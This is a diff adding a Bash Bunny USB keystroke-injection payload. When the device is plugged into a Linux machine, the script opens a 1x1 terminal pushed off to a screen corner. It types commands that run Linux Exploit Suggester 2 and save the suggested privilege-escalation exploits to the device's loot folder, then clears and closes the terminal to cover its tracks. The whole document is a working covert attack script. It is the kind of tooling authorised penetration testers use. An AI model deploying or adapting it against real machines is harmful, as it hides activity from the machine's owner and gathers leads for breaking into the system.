@@ -1,0 +1,39 @@
+#!/bin/bash
+#
+# Title: LinES
+# Description: Bash Bunny Linux Exploit Suggester launcher
+# Original Author: Raul Bringas (r4mzih4x)
+# https://github.com/jondonas/linux-exploit-suggester-2
+# Linux Exploit Suggester 2 Author: @jondonas
+# Version: 0.1
+# Category: Recon
+# Target: Linux
+# Attackmodes: HID, STORAGE
+#
+
+# Setup
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+# Attack
+LED ATTACK
+# Make the terminal very small and hide on bottom right corner
+RUN UNITY xterm -geometry 1x1+1500+1500
+Q DELAY 1000
+Q STRING export lootdir=/media/\$USER/BashBunny/loot/BunnyLinES
+Q ENTER
+Q STRING mkdir -p \$lootdir
+Q ENTER
+Q STRING export scriptdir=/media/\$USER/BashBunny/payloads/$SWITCH_POSITION
+Q ENTER
+Q STRING perl \$scriptdir/linux-exploit-suggester2.pl \> \$lootdir/suggested-exploits.txt
+Q ENTER
+# Clear and close out terminal after running the script
+Q STRING clear
+Q ENTER
+Q STRING exit
+Q ENTER
+
+# Attack completed
+LED FINISH
